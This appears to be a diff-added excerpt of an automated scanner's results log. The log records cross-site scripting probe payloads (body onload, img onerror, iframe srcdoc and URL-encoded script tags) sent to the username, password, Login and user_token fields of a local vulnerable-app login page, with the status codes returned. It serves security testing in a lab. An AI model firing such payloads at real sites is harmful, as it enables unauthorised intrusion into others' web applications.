+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
